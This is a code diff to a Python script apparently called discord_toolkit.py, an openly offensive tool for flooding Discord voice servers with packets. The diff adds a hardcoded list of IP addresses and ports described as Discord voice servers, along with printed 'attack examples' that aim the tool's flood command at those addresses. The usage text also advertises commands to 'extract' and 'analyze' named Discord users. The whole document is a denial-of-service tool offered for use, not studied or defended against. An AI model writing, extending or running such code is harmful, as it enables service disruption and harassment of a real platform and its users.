@@ -187,6 +187,42 @@ def attack_voice_ip(target_ip, target_port, duration=30, threads=50, packets_per
     print(f"{RED}[STATS]{RESET} {GRAY}Total packets sent: {packet_count}{RESET}")
     print()
 
+def list_discord_ips():
+    """
+    List all Discord Voice server IPs with common ports including 19328
+    """
+    print(f"{RED}[DISCORD VOICE SERVERS]{RESET}")
+    print()
+
+    discord_servers = [
+        ("162.159.128.233", [443, 19328, 50000, 50001, 50002]),
+        ("162.159.130.233", [443, 19328, 50000, 50001, 50002]),
+        ("162.159.132.233", [443, 19328, 50000, 50001, 50002]),
+        ("104.16.248.248", [443, 19328, 50000, 50001, 50002]),
+        ("104.16.249.248", [443, 19328, 50000, 50001, 50002]),
+        ("162.159.134.233", [443, 19328, 50000, 50001, 50002]),
+        ("162.159.136.233", [443, 19328, 50000, 50001, 50002]),
+        ("162.159.138.233", [443, 19328, 50000, 50001, 50002]),
+    ]
+
+    print(f"{RED}[SERVER LIST]{RESET}")
+    for ip, ports in discord_servers:
+        print(f"{GRAY}|-{RESET} IP: {RED}{ip}{RESET}")
+        print(f"{GRAY}   |-{RESET} Ports: {GRAY}{', '.join(map(str, ports))}{RESET}")
+        print(f"{GRAY}   |-{RESET} Region: {GRAY}Global{RESET}")
+        print()
+
+    print(f"{RED}[COMMON PORTS]{RESET}")
+    print(f"{GRAY}|-{RESET} 443 - HTTPS (Control)")
+    print(f"{GRAY}|-{RESET} 19328 - Voice (Custom)")
+    print(f"{GRAY}|-{RESET} 50000-65535 - Voice (UDP Range)")
+    print()
+
+    print(f"{RED}[ATTACK EXAMPLES]{RESET}")
+    print(f"{GRAY}|-{RESET} python discord_toolkit.py attack 162.159.128.233 19328 30 50 1000")
+    print(f"{GRAY}|-{RESET} python discord_toolkit.py attack 104.16.248.248 50000 30 50 1000")
+    print()
+
 def main():
     if len(sys.argv) < 2:
         print_banner()
@@ -196,12 +232,14 @@ def main():
         print(f"{GRAY}|-{RESET} extract <target> <duration>")
         print(f"{GRAY}|-{RESET} analyze <user> <duration>")
         print(f"{GRAY}|-{RESET} attack <ip> <port> <duration> <threads>")
+        print(f"{GRAY}|-{RESET} list - List Discord Voice IPs and ports")
         print(f"{GRAY}|-{RESET} info")
         print()
         print(f"{RED}[EXAMPLES]{RESET}")
         print(f"{GRAY}|-{RESET} python discord_toolkit.py extract user#1234 30")
         print(f"{GRAY}|-{RESET} python discord_toolkit.py analyze user#1234 30")
-        print(f"{GRAY}|-{RESET} python discord_toolkit.py attack 192.168.1.1 50000 30 50")
+        print(f"{GRAY}|-{RESET} python discord_toolkit.py attack 192.168.1.1 19328 30 50 1000")
+        print(f"{GRAY}|-{RESET} python discord_toolkit.py list")
         print(f"{GRAY}|-{RESET} python discord_toolkit.py info")
         print()
         return
@@ -237,6 +275,10 @@ def main():
         packets = int(sys.argv[6]) if len(sys.argv) > 6 else 1000
         print_banner()
         attack_voice_ip(ip, port, duration, threads, packets)
+
+    elif command == "list":
+        print_banner()
+        list_discord_ips()
 
     elif command == "info":
         print_banner()
